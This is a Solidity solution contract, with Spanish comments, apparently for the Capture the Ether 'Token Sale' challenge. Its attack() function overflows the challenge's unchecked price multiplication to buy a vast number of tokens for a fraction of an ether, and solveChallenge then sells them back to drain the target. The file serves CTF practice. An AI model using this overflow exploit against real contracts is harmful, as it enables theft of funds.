pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {}

    function isComplete() public view returns (bool) {}

    function buy(uint256 numTokens) public payable {}

    function sell(uint256 numTokens) public {}
}

contract TokenSaleSolve {
    address private targetContract = 0x4bfD02Ab881AC73e800C4d54Df36c50096Ac806f;
    address public owner;
    TokenSaleChallenge target;
    
    // Para evitar que alguien mas saque el ether del contrato
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // Comprueba que efectivamente yo sea el dueño (debug)
    function isOwner() public view returns(bool) {
        return msg.sender == owner;
    }
    
    // Constructor, guardo un puntero al contrato objetivo en target
    constructor() public payable {
        owner = msg.sender;
        target = TokenSaleChallenge(targetContract);
    }
    
    // Fallback para recibir fondos
    function() public payable { }
    
    // Para recuperar el ether del contrato, manda solo al owner
    function recoverFunds() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }
    
    function testValue() public view returns(uint256) {
        uint256 value = (uint256(-1)/10**18) +1;
        return value * 10**18;
    }
    
    function attack() public payable {
        uint256 amount = (uint256(-1)/10**18) +1;
        target.buy.value(415992086870360064)(amount);
    }
    
    // Llamo a la funcion del contrato destino solo si se cumple la condicion, en caso contrario pierdo los fondos
    function solveChallenge(uint256 amount) public payable {
        target.sell(amount);
    }
}